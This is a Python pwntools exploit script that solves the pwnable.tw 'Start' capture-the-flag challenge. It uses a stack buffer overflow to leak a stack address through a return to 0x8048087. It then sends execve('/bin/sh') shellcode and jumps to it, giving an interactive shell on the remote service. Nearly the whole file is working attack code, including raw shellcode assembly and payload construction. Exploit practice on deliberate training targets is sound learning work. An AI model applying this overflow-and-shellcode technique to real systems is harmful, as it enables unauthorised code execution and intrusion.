#!/usr/bin/env python3
"""
pwnable.tw - Start (100 pts)
Exploit: Stack buffer overflow with stack address leak

Vulnerability:
- Program reads 60 bytes but only allocates 20 bytes buffer
- Can overwrite return address and execute shellcode on stack

Strategy:
1. Overwrite return address with 0x8048087 (mov %esp, %ecx) to leak stack
2. Calculate shellcode address and send shellcode

Usage:
    python3 exploit.py        # Remote
    python3 exploit.py local  # Local testing
"""

from pwn import *
import sys

context.arch = 'i386'
context.os = 'linux'

def exploit():
    # Connect to remote service or local binary
    if len(sys.argv) > 1 and sys.argv[1] == 'local':
        p = process('./start')
    else:
        p = remote('chall.pwnable.tw', 10000)

    # Receive initial message "Let's start the CTF:"
    p.recvuntil(b"CTF:")

    # ============ Stage 1: Leak stack address ============
    # Return to 0x8048087 (mov %esp, %ecx; ... write ...; ... read ...; ret)
    # This will write 20 bytes from ESP, leaking the saved stack pointer

    payload1 = b'A' * 20 + p32(0x08048087)
    p.send(payload1)

    # Receive leaked data (20 bytes, first 4 are the stack address)
    leak = p.recv(20)
    stack_addr = u32(leak[:4])
    log.success(f"Leaked stack address: {hex(stack_addr)}")

    # ============ Stage 2: Execute shellcode ============
    # After second read, stack layout:
    # - 20 bytes padding
    # - 4 bytes return address (at stack_addr + 16)
    # - shellcode starts at stack_addr + 20

    shellcode_addr = stack_addr + 20
    log.info(f"Shellcode address: {hex(shellcode_addr)}")

    # Shellcode: execve("/bin/sh", NULL, NULL)
    shellcode = asm('''
        xor eax, eax
        push eax
        push 0x68732f2f   /* "//sh" */
        push 0x6e69622f   /* "/bin" */
        mov ebx, esp      /* ebx = pointer to "/bin//sh" */
        xor ecx, ecx      /* ecx = NULL */
        xor edx, edx      /* edx = NULL */
        mov al, 0xb       /* syscall number for execve */
        int 0x80
    ''')

    log.info(f"Shellcode length: {len(shellcode)} bytes")

    # Build payload: padding + return_addr + shellcode
    payload2 = b'A' * 20 + p32(shellcode_addr) + shellcode
    p.send(payload2)

    log.success("Exploit sent! Enjoy your shell!")
    p.interactive()

if __name__ == '__main__':
    exploit()
